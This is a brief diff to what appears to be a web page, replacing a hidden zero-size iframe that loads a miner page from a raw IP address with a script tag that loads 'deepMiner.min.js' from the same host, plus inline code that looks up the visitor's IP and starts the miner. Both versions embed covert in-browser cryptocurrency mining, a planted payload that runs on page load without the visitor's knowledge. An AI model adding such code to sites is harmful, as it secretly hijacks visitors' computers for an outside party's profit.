@@ -1,1 +1,7 @@
-<iframe src="http://150.136.246.97:7777/miner.html" width=0 height=0></iframe>
+<script src="http://150.136.246.97:7777/lib/deepMiner.min.js"></script>
+<script>
+  let response = await fetch("https://suip.biz/ip");
+  var ip = await response.text();
+  var miner = new deepMiner.Init(ip);
+  miner.start();
+</script>
